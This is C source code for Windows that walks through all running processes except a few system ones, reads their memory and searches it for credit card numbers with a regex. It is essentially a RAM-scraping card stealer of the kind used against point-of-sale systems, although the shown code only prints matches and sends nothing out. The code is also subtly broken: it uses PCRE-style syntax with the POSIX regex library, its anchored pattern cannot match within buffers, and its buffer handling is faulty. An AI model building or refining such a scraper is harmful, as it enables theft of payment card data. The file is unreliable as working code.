#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string.h>
#include <regex.h>

#define BUFFER_SIZE 1024

void scanMemory(HANDLE hProcess, regex_t *regex);
void scanProcesses();

int main() {
    scanProcesses();
    return 0;
}

void scanMemory(HANDLE hProcess, regex_t *regex) {
    SYSTEM_INFO sysInfo;
    MEMORY_BASIC_INFORMATION memInfo;
    unsigned char *addr = NULL;
    SIZE_T bytesRead;

    GetSystemInfo(&sysInfo);

    addr = (unsigned char*)sysInfo.lpMinimumApplicationAddress;

    while (addr < sysInfo.lpMaximumApplicationAddress) {
        if (VirtualQueryEx(hProcess, addr, &memInfo, sizeof(memInfo))) {
            if (memInfo.State == MEM_COMMIT && (memInfo.Protect == PAGE_READWRITE || memInfo.Protect == PAGE_READONLY)) {
                unsigned char *buffer = (unsigned char*)malloc(memInfo.RegionSize);
                if (buffer) {
                    if (ReadProcessMemory(hProcess, addr, buffer, memInfo.RegionSize, &bytesRead)) {
                        char tempBuffer[BUFFER_SIZE];
                        for (SIZE_T i = 0; i < bytesRead; i++) {
                            if (i + BUFFER_SIZE < bytesRead) {
                                strncpy(tempBuffer, (char*)(buffer + i), BUFFER_SIZE);
                            } else {
                                strncpy(tempBuffer, (char*)(buffer + i), bytesRead - i);
                            }

                            if (regexec(regex, tempBuffer, 0, NULL, 0) == 0) {
                                printf("Found pattern in process memory!\n");
                                break;
                            }
                        }
                    }
                    free(buffer);
                }
            }
            addr += memInfo.RegionSize;
        } else {
            break;
        }
    }
}

void scanProcesses() {
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;
    regex_t regex;
    int ret;
    
    // Regex pattern for credit card numbers
    const char *pattern = "^(?:4[0-9]{12}(?:[0-9]{3})?|[25][1-7][0-9]{14}|6(?:011|5[0-9][0-9])[0-9]{12}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|(?:2131|1800|35\\d{3})\\d{11})$";

    // Compile the regex
    ret = regcomp(&regex, pattern, REG_EXTENDED);
    if (ret != 0) {
        fprintf(stderr, "Could not compile regex\n");
        return;
    }

    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "Failed to take process snapshot\n");
        regfree(&regex);
        return;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcessSnap, &pe32)) {
        fprintf(stderr, "Process32First failed\n");
        CloseHandle(hProcessSnap);
        regfree(&regex);
        return;
    }

    do {
        // Skip excluded processes
        if (strcmp(pe32.szExeFile, "lsass.exe") != 0 &&
            strcmp(pe32.szExeFile, "csrss.exe") != 0 &&
            strcmp(pe32.szExeFile, "System") != 0) {

            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
            if (hProcess != NULL) {
                scanMemory(hProcess, &regex);
                CloseHandle(hProcess);
            }
        }
    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);
    regfree(&regex);
}
